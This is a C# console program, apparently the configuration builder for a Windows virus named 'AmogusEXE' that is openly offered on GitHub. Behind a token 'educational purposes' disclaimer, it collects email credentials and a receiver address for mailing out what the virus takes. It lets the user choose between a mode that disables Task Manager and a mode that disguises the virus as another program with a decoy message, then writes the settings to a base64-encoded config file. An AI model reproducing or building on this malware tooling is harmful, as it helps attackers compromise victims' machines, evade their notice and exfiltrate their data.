using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mime;
namespace AEXEC
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Disclaimer:\n");
            Console.WriteLine(
@"
By proceeding, you agree that you will only
use given software for educational 
purposes, and only you will be 
responsible for the actions you make
with this software.

Enter ""yes"" if you read this disclaimer and 
agreed to it.

");
            string inpt = Console.ReadLine();
            if (!inpt.ToLower().Contains("yes"))
            {
                Environment.Exit(420);
            }

            Console.Clear();
            Console.WriteLine("Welcome to AmogusEXE Configurator!");
            Console.WriteLine("If you don't understand anything, go to https://github.com/Maxuss/AmongVirUs/blob/main/README.md for more info.");
            Console.WriteLine("Sender Email address: ");
            string email = Console.ReadLine();
            Console.WriteLine("Sender Email password: ");
            string password = Console.ReadLine();
            Console.WriteLine("Receiver Email address: ");
            string receiver = Console.ReadLine();
            Console.WriteLine("Should the virus be blatant?");
            Console.WriteLine("Blatant virus will disable task manager and do some more stuff");
            Console.WriteLine("Non-blatant virus will not disable task manager, and will try to look like different program.");
            Console.WriteLine("Enter 0 for blatant and 1 for non-blatant");
            string bl = Console.ReadLine();
            string blatant;
            string msg = String.Empty;
            switch (bl)
            {
                case "0":
                    blatant = "true";
                    break;
                case "1":
                    blatant = "false";
                    Console.WriteLine("Enter message, that will be show to user at start: ");
                    msg = Console.ReadLine();
;                    break;
                default:
                    goto case "1";
            }
            Console.WriteLine("Writing config file...");
            
            string data = "{\"mail\":{\"login\": \""+email+" \",\"password\": \""+password+"\", \"receiver\": \""+receiver+"\"}, \"blatant\":\""+blatant+"\", \"hideMessage\": \""+msg+"\"}";
            byte[] bytes = System.Text.Encoding.UTF8.GetBytes(data);
            string converted = Convert.ToBase64String(bytes);
            File.WriteAllText($"{Directory.GetCurrentDirectory()}\\data", converted);
            File.WriteAllText($"{Directory.GetCurrentDirectory()}\\data.enc", converted);
            
            Console.WriteLine("Finished creating config file!");
            Console.ReadKey();
        }
    }
}